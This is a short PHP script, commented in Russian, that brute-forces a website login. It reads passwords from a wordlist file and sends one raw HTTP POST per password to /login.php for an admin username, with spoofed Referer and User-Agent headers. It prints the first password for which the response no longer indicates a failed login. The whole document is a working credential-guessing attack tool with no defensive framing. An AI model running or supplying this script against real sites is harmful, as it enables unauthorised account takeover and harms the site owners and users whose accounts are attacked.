<?php
/*
* Simple POST Bruteforce PHP
*/
$sitename = 'www.site.ru';

$file = file($_SERVER['DOCUMENT_ROOT'].'/brut.txt');
foreach ($file as $password) {

    // открываем сокет на хост www.site.ru
    $fp = fsockopen($sitename, 80, $errno, $errstr, 3000);

    // Проверяем успешность установки соединения
    if (!$fp) {
        echo $errstr.$errno; // вывод ошибки
    }
    else {
        // переменные
        $data = 'do=login&Submit=submit&username=admin@site.com&password='.$password;

        // заголовки
        $headers  = "POST /login.php HTTP/1.1\r\n"; // POST-запрос для login.php
        $headers .= "Host: " . $sitename . "\r\n";
        $headers .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1\r\n";
        $headers .= "Referer: " . $sitename . "\r\n"; // подделка Referer
        $headers .= "Content-Type: application/x-www-form-urlencoded\r\n";
        $headers .= "Content-Length: ".strlen($data)."\n\n";
        $headers .= $data."\n\n"; 

        // отправляем HTTP-запрос серверу
        fwrite($fp, $headers); 

        // получаем ответ
        $line = '';
        while (!feof($fp)) {
            $line .= fgets($fp, 1024);
        } 

        unset($headers);
        fclose($fp); 

        if (!strstr($line,'password=deleted')) {
            echo 'password: '.$password;
            break;
        }
    }
}
?>
